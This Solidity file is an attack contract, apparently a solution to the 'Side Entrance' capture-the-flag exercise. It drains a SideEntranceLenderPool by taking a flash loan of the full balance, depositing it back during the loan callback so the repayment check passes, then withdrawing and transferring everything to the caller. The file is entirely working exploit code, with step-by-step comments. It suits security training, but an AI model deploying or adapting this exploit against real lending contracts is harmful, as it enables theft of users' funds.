// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract Attack {
    // 1) flash loan all ether
    // 2) make a deposit (this will elude final requirement)
    // 3) withdraw

    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
